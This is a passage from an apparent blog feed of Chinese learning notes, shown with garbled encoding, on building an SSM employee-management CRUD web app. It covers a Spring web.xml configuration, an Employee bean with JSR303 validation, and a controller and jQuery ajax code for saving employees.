<span class="attr">version</span>=<span class="string">"4.0"</span>&gt;</span></span><br><span class="line"></span><br><span class="line">  <span class="tag">&lt;<span class="name">display-name</span>&gt;</span>Archetype Created Web Application<span class="tag">&lt;/<span class="name">display-name</span>&gt;</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">&lt;!--1.å¯åŠ¨Springçš„å®¹å™¨  --&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">context-param</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">param-name</span>&gt;</span>contextConfigLocation<span class="tag">&lt;/<span class="name">param-name</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">param-value</span>&gt;</span>classpath:applicationContext.xml<span class="tag">&lt;/<span class="name">param-value</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">context-param</span>&gt;</span></span><br><span class="line"></span><br><span class="line">  <span class="tag">&lt;<span class="name">listener</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">listener-class</span>&gt;</span>org.springframework.web.context.ContextLoaderListener<span class="tag">&lt;/<span class="name">listener-class</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">listener</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&lt;!-- 2.spring mvcçš„å‰ç«¯æ§åˆ¶å™¨ï¼Œæ‹¦æˆªæ‰€æœ‰è¯·æ±‚--&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">servlet</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">servlet-name</span>&gt;</span>dispatcherServlet<span class="tag">&lt;/<span class="name">servlet-name</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">servlet-class</span>&gt;</span>org.springframework.web.servlet.DispatcherServlet<span class="tag">&lt;/<span class="name">servlet-class</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">servlet</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">servlet-mapping</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">servlet-name</span>&gt;</span>dispatcherServlet<span class="tag">&lt;/<span class="name">servlet-name</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">url-pattern</span>&gt;</span>/<span class="tag">&lt;/<span class="name">url-pattern</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">servlet-mapping</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&lt;!--  3.å­—ç¬¦ç¼–ç è¿‡æ»¤å™¨  ä¸€å®šè¦æ”¾åœ¨æ‰€æœ‰è¿‡æ»¤å™¨ä¹‹å‰--&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">filter</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">filter-name</span>&gt;</span>CharacterEncodingFilter<span class="tag">&lt;/<span class="name">filter-name</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">filter-class</span>&gt;</span>org.springframework.web.filter.CharacterEncodingFilter<span class="tag">&lt;/<span class="name">filter-class</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">init-param</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">param-name</span>&gt;</span>encoding<span class="tag">&lt;/<span class="name">param-name</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">param-value</span>&gt;</span>utf-8<span class="tag">&lt;/<span class="name">param-value</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">init-param</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">init-param</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">param-name</span>&gt;</span>forceRequestEncoding<span class="tag">&lt;/<span class="name">param-name</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">param-value</span>&gt;</span>true<span class="tag">&lt;/<span class="name">param-value</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">init-param</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">init-param</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">param-name</span>&gt;</span>forceResponseEncoding<span class="tag">&lt;/<span class="name">param-name</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">param-value</span>&gt;</span>true<span class="tag">&lt;/<span class="name">param-value</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">init-param</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">filter</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">filter-mapping</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">filter-name</span>&gt;</span>CharacterEncodingFilter<span class="tag">&lt;/<span class="name">filter-name</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">url-pattern</span>&gt;</span>/*<span class="tag">&lt;/<span class="name">url-pattern</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">filter-mapping</span>&gt;</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">&lt;!-- 4.ä½¿ç”¨Resté£æ ¼çš„URI  å°†é¡µé¢æ™®é€šçš„POSTè¯·æ±‚è½¬ä¸ºæŒ‡å®šçš„deleteæˆ–putè¯·æ±‚ --&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">filter</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">filter-name</span>&gt;</span>hiddenHttpMethodFilter<span class="tag">&lt;/<span class="name">filter-name</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">filter-class</span>&gt;</span>org.springframework.web.filter.HiddenHttpMethodFilter<span class="tag">&lt;/<span class="name">filter-class</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">filter</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">filter-mapping</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">filter-name</span>&gt;</span>hiddenHttpMethodFilter<span class="tag">&lt;/<span class="name">filter-name</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">url-pattern</span>&gt;</span>/*<span class="tag">&lt;/<span class="name">url-pattern</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">filter-mapping</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">filter</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">filter-name</span>&gt;</span>HttpPutFormContentFilter<span class="tag">&lt;/<span class="name">filter-name</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">filter-class</span>&gt;</span>org.springframework.web.filter.HttpPutFormContentFilter<span class="tag">&lt;/<span class="name">filter-class</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">filter</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">filter-mapping</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">filter-name</span>&gt;</span>HttpPutFormContentFilter<span class="tag">&lt;/<span class="name">filter-name</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">url-pattern</span>&gt;</span>/*<span class="tag">&lt;/<span class="name">url-pattern</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">filter-mapping</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="name">web-app</span>&gt;</span></span><br></pre></td></tr></table></figure></p><p>æœ€åçš„Employee<br><figure class="highlight arduino"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br></pre></td><td class="code"><pre><span class="line">package com.ceit.crud.bean;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.hibernate.validator.constraints.Length;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.validation.constraints.Email;</span><br><span class="line"><span class="keyword">import</span> javax.validation.constraints.Pattern;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Employee</span> &#123;</span></span><br><span class="line">    <span class="keyword">private</span> Integer empId;</span><br><span class="line"></span><br><span class="line">    @Pattern(regexp = <span class="string">"(^[a-zA-Z0-9_-]&#123;6,16&#125;$)|(^[\\u2E80-\\u9FFF]&#123;2,5&#125;)"</span></span><br><span class="line">            ,message = <span class="string">"ç”¨æˆ·åå¿…é¡»æ˜¯2-5ä½ä¸­æ–‡æˆ–6-16ä½è‹±æ–‡å’Œæ•°å­—çš„ç»„åˆ"</span>)</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">String</span> empName;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">String</span> gender;</span><br><span class="line"></span><br><span class="line"><span class="comment">//    @Email</span></span><br><span class="line">    @Pattern(regexp = <span class="string">"^([a-zA-Z0-9_.-]+)@([da-z.-]+).([a-z.]&#123;2,6&#125;)$"</span></span><br><span class="line">            ,message = <span class="string">"é‚®ç®±æ ¼å¼ä¸æ­£ç¡®"</span>)</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">String</span> email;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> Integer dId;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> Department department;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> Department <span class="title">getDepartment</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> department;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">Employee</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        super();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">Employee</span><span class="params">(Integer empId, <span class="keyword">String</span> empName, <span class="keyword">String</span> gender, <span class="keyword">String</span> email, Integer dId)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.empId = empId;</span><br><span class="line">        <span class="keyword">this</span>.empName = empName;</span><br><span class="line">        <span class="keyword">this</span>.gender = gender;</span><br><span class="line">        <span class="keyword">this</span>.email = email;</span><br><span class="line">        <span class="keyword">this</span>.dId = dId;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setDepartment</span><span class="params">(Department department)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.department = department;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> Integer <span class="title">getEmpId</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> empId;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setEmpId</span><span class="params">(Integer empId)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.empId = empId;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">String</span> <span class="title">getEmpName</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> empName;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setEmpName</span><span class="params">(<span class="keyword">String</span> empName)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.empName = empName == null ? null : empName.trim();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">String</span> <span class="title">getGender</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> gender;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setGender</span><span class="params">(<span class="keyword">String</span> gender)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.gender = gender == null ? null : gender.trim();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">String</span> <span class="title">getEmail</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> email;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setEmail</span><span class="params">(<span class="keyword">String</span> email)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.email = email == null ? null : email.trim();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> Integer <span class="title">getdId</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> dId;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setdId</span><span class="params">(Integer dId)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.dId = dId;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>ä»¥ä¸Šå°±æ˜¯ä¸ä¹‹å‰è¿›è¡Œè¿‡ä¿®æ”¹çš„æ‰€æœ‰ä»£ç äº†</p><h1 id="æ€»ç»“"><a href="#æ€»ç»“" class="headerlink" title="æ€»ç»“"></a>æ€»ç»“</h1><p>è¿™é‡Œç”»ä¸€ä¸ªå›¾æ¥æ€»ç»“ä¸€ä¸‹æ€è·¯<br><img src="/img/JavaWeb/10-21å­¦ä¹ æ—¥è®°/1.jpg" alt="avatar"></p><p>å¦‚æœè¦éƒ¨ç½²åˆ°çœŸå®çš„æœåŠ¡å™¨ï¼Œä½¿ç”¨mavenæ„å»ºwaråŒ…å°±å¥½äº†</p><p>æ³¨æ„ç‚¹ï¼š</p><ol><li><p>æ–°å¢ï¼Œä¿®æ”¹ï¼Œå¼•å…¥æ•°æ®æ ¡éªŒï¼ˆå‰åç«¯ï¼‰</p></li><li><p>åˆ é™¤ï¼Œå•ä¸ª&amp;æ‰¹é‡</p></li><li><p>mybatis generator-xxMapper</p></li><li><p>ajax,SpringMVC-@ResponseBody</p></li></ol><p><a href="/download/SSM.zip">æºç ä¸‹è½½</a></p><p>ğŸŒ¸ğŸŒ¸ğŸŒ¸å®Œç»“æ’’èŠ±ğŸŒ¸ğŸŒ¸ğŸŒ¸</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;å‘˜å·¥ä¿®æ”¹&quot;&gt;&lt;a href=&quot;#å‘˜å·¥ä¿®æ”¹&quot; class=&quot;headerlink&quot; title=&quot;å‘˜å·¥ä¿®æ”¹&quot;&gt;&lt;/a&gt;å‘˜å·¥ä¿®æ”¹&lt;/h1&gt;&lt;h2 id=&quot;æ›´æ–°ä¿¡æ¯&quot;&gt;&lt;a href=&quot;#æ›´æ–°ä¿¡æ¯&quot; class=&quot;headerlink&quot; title=&quot;æ›´æ–°ä¿¡æ¯&quot;&gt;&lt;/a
      
    
    </summary>
    
    
      <category term="æ—¥å¸¸å­¦ä¹ " scheme="http://yoursite.com/categories/%E6%97%A5%E5%B8%B8%E5%AD%A6%E4%B9%A0/"/>
    
      <category term="JavaWeb" scheme="http://yoursite.com/categories/%E6%97%A5%E5%B8%B8%E5%AD%A6%E4%B9%A0/JavaWeb/"/>
    
    
      <category term="å¼€å‘" scheme="http://yoursite.com/tags/%E5%BC%80%E5%8F%91/"/>
    
  </entry>
  
  <entry>
    <title>SSM-2020/10/19-å‘˜å·¥ç®¡ç†ç³»ç»Ÿ-4</title>
    <link href="http://yoursite.com/2020/10/19/SSM-2020-10-19-%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"/>
    <id>http://yoursite.com/2020/10/19/SSM-2020-10-19-%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/</id>
    <published>2020-10-19T11:05:00.000Z</published>
    <updated>2021-02-21T04:57:54.528Z</updated>
    
    <content type="html"><![CDATA[<h1 id="ä¿å­˜"><a href="#ä¿å­˜" class="headerlink" title="ä¿å­˜"></a>ä¿å­˜</h1><h2 id="æ ¡éªŒ"><a href="#æ ¡éªŒ" class="headerlink" title="æ ¡éªŒ"></a>æ ¡éªŒ</h2><p>ä¹‹å‰å®Œæˆäº†å‰ç«¯ï¼Œåˆæ³•æ€§å’Œé‡å¤æ€§çš„æ£€éªŒï¼Œä½†æ˜¯ç”±äºæ·»åŠ äº†ä¸€ä¸ªè‡ªå®šä¹‰çš„ajax-vaï¼Œæ‰€ä»¥è¿˜æ˜¯ä¼šå‡ºç°ä¸€ä¸ªé”™è¯¯ï¼Œå°±æ˜¯ajax-vaçš„å­˜åœ¨å¯¼è‡´äº†æ•°æ®æ— æ³•æäº¤ï¼Œä½†æ˜¯å°†å…¶æ”¹ä¸ºsuccessæ—¶ï¼Œåˆå¯ä»¥æˆåŠŸæäº¤å¹¶ç»•è¿‡é‡å¤æ€§çš„æ£€éªŒï¼Œè¿™æ˜¯ä¸æœŸæœ›çœ‹åˆ°çš„</p><p>æ‰€ä»¥è¿˜éœ€è¦ä¸€ä¸ªåç«¯æ ¡éªŒä»¥åŠæ•°æ®åº“çº¦æŸç­‰</p><p>å·²å®Œæˆçš„æ ¡éªŒï¼š</p><ul><li><p>jqueryå‰ç«¯æ ¡éªŒ</p></li><li><p>ajaxç”¨æˆ·åé‡å¤æ ¡éªŒ</p></li><li><p>åˆæ³•æ€§æ ¡éªŒ</p></li></ul><h3 id="åç«¯æ ¡éªŒ-JSR303"><a href="#åç«¯æ ¡éªŒ-JSR303" class="headerlink" title="åç«¯æ ¡éªŒ(JSR303)"></a>åç«¯æ ¡éªŒ(JSR303)</h3><p>è¿™æ˜¯ä¸ºäº†é˜²æ­¢ç”¨æˆ·æäº¤éæ³•æ•°æ®ï¼Œæ·»åŠ å”¯ä¸€çº¦æŸï¼Œå°¤å…¶æ˜¯å¯¹äºé‡è¦æ•°æ®ï¼Œå¿…é¡»è¦æ·»åŠ åç«¯æ ¡éªŒ</p><p>éœ€è¦å¯¼å…¥Hibernate-ValidatoråŒ…ï¼Œä¾æ—§æ˜¯æ·»åŠ mavenä¾èµ–<br><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!--    JSR303æ ¡éªŒ  æ•°æ®æ ¡éªŒæ”¯æŒ--&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.hibernate.validator<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>hibernate-validator<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">version</span>&gt;</span>6.1.6.Final<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure></p><p>åœ¨Employee.javaä¸­ç»™empNameå’Œemailæ·»åŠ ä¸ŠJSR303æ£€éªŒæ ‡å‡†<br><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">@<span class="keyword">Pattern</span>(<span class="keyword">regexp</span> = <span class="string">"(^[a-zA-Z0-9_-]&#123;6,16&#125;$)|(^[\\u2E80-\\u9FFF]&#123;2,5&#125;)"</span></span><br><span class="line">        ,message = <span class="string">"ç”¨æˆ·åå¿…é¡»æ˜¯2-5ä½ä¸­æ–‡æˆ–6-16ä½è‹±æ–‡å’Œæ•°å­—çš„ç»„åˆ"</span>)</span><br><span class="line">private String empName;</span><br></pre></td></tr></table></figure></p><figure class="highlight kotlin"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//    @Email</span></span><br><span class="line">    <span class="meta">@Pattern(regexp = <span class="meta-string">"^([a-zA-Z0-9_.-]+)@([da-z.-]+).([a-z.]&#123;2,6&#125;)$"</span></span></span><br><span class="line"><span class="meta">            ,message = <span class="meta-string">"é‚®ç®±æ ¼å¼ä¸æ­£ç¡®"</span>)</span></span><br><span class="line">    <span class="keyword">private</span> String email;</span><br></pre></td></tr></table></figure><p>Emailå¯ä»¥ç›´æ¥å†™@Emailæˆ–è‡ªå®šä¹‰</p><p>è¦æƒ³æ ¡éªŒå®ç°ï¼Œåªéœ€è¦åœ¨Controllerçš„å¯¹åº”æ–¹æ³•ä¸­çš„å°è£…å¯¹è±¡æ·»åŠ ä¸Š@Valid å°±å¯ä»¥ä»£è¡¨å°è£…å¯¹è±¡ä¹‹åï¼Œå°è£…çš„æ•°æ®è¦è¿›è¡Œæ ¡éªŒï¼Œè¿˜å¯ä»¥å®šä¹‰ä¸€ä¸ªBindingResultå¯¹è±¡æ¥å°è£…æ ¡éªŒçš„ç»“æœ<br><figure class="highlight reasonml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * å‘˜å·¥ä¿å­˜</span></span><br><span class="line"><span class="comment"> * 1.æ”¯æŒJSR303æ ¡éªŒ</span></span><br><span class="line"><span class="comment"> * 2. å¯¼å…¥Hibernate-validator</span></span><br><span class="line"><span class="comment"> * @param employee</span></span><br><span class="line"><span class="comment"> * @return</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line">@<span class="constructor">RequestMapping(<span class="params">value</span> = <span class="string">"/emp"</span>,<span class="params">method</span> = RequestMethod.POST)</span></span><br><span class="line">@ResponseBody</span><br><span class="line">public Msg save<span class="constructor">Emp(@Valid  Employee <span class="params">employee</span>, BindingResult <span class="params">result</span>)</span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(result.has<span class="constructor">Errors()</span>)&#123;</span><br><span class="line">        <span class="comment">//æ ¡éªŒå¤±è´¥åº”è¯¥è¿”å›å¤±è´¥ï¼Œåœ¨æ¨¡æ€æ¡†ä¸­æ˜¾ç¤ºæ ¡éªŒå¤±è´¥çš„é”™è¯¯ä¿¡æ¯</span></span><br><span class="line">        Map&lt;String,Object&gt; map = <span class="keyword">new</span> HashMap&lt;&gt;<span class="literal">()</span>;</span><br><span class="line">        List&lt;FieldError&gt; errors = result.get<span class="constructor">FieldErrors()</span>;</span><br><span class="line">        for(FieldError fieldError : errors)&#123;</span><br><span class="line">            <span class="module-access"><span class="module"><span class="identifier">System</span>.</span></span>out.println(<span class="string">"é”™è¯¯çš„å­—æ®µåï¼š"</span>+fieldError.get<span class="constructor">Field()</span>);</span><br><span class="line">            <span class="module-access"><span class="module"><span class="identifier">System</span>.</span></span>out.println(<span class="string">"é”™è¯¯ä¿¡æ¯ï¼š"</span>+fieldError.get<span class="constructor">DefaultMessage()</span>);</span><br><span class="line">            map.put(fieldError.get<span class="constructor">Field()</span>,fieldError.get<span class="constructor">DefaultMessage()</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        return <span class="module-access"><span class="module"><span class="identifier">Msg</span>.</span></span>fail<span class="literal">()</span>.add(<span class="string">"errorFields"</span>,map);</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        employeeService.save<span class="constructor">Emp(<span class="params">employee</span>)</span>;</span><br><span class="line">        return <span class="module-access"><span class="module"><span class="identifier">Msg</span>.</span></span>success<span class="literal">()</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><br>è¿˜éœ€è¦ä¿®æ”¹ä¸€ä¸‹index.jspï¼Œè®©ä»–ç‚¹å‡»å®Œä¿å­˜ä¹‹åï¼Œæœ‰è¿›ä¸€æ­¥çš„æ ¡éªŒå’Œæç¤ºä¿¡æ¯<br><figure class="highlight reasonml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//ç‚¹å‡»ä¿å­˜ï¼Œä¿å­˜å‘˜å·¥</span></span><br><span class="line"><span class="constructor">$(<span class="string">"#emp_save_btn"</span>)</span>.click(<span class="keyword">function</span> <span class="literal">()</span> &#123;</span><br><span class="line">    <span class="comment">//1.æ¨¡æ€æ¡†ä¸­å¡«å†™çš„è¡¨å•æ•°æ®æäº¤ç»™æœåŠ¡å™¨è¿›è¡Œä¿å­˜</span></span><br><span class="line">    <span class="comment">//2.å…ˆå¯¹è¦æäº¤ç»™æœåŠ¡å™¨çš„æ•°æ®è¿›è¡Œæ ¡éªŒ</span></span><br><span class="line">    <span class="keyword">if</span>(!validata<span class="constructor">_add_form()</span>)&#123;</span><br><span class="line">        return <span class="literal">false</span>;</span><br><span class="line">    &#125;;</span><br><span class="line">    <span class="comment">//3.åˆ¤æ–­ä¹‹å‰çš„ajaxç”¨æˆ·åæ ¡éªŒæ˜¯å¦æˆåŠŸ</span></span><br><span class="line">    <span class="keyword">if</span>(<span class="constructor">$(<span class="params">this</span>)</span>.attr(<span class="string">"ajax-va"</span>)==<span class="string">"error"</span>)&#123;</span><br><span class="line">        return <span class="literal">false</span>;</span><br><span class="line">    &#125;;</span><br><span class="line">    <span class="comment">//4.å‘é€ajaxè¯·æ±‚ä¿å­˜å‘˜å·¥</span></span><br><span class="line">    <span class="comment">// alert($("#empAddModal form").serialize());</span></span><br><span class="line">    $.ajax(&#123;</span><br><span class="line">        url:<span class="string">"$&#123;APP_PATH&#125;/emp"</span>,</span><br><span class="line">        <span class="keyword">type</span>:<span class="string">"POST"</span>,</span><br><span class="line">        data:<span class="constructor">$(<span class="string">"#empAddModal form"</span>)</span>.serialize<span class="literal">()</span>,</span><br><span class="line">        success:<span class="keyword">function</span> (result) &#123;</span><br><span class="line">            <span class="comment">//alert(result.msg);</span></span><br><span class="line">            <span class="keyword">if</span>(result.code<span class="operator"> == </span><span class="number">200</span>)&#123;</span><br><span class="line">                <span class="comment">//å‘˜å·¥ä¿å­˜æˆåŠŸï¼š</span></span><br><span class="line">                <span class="comment">//1. å…³é—­æ¨¡æ€æ¡†</span></span><br><span class="line">                <span 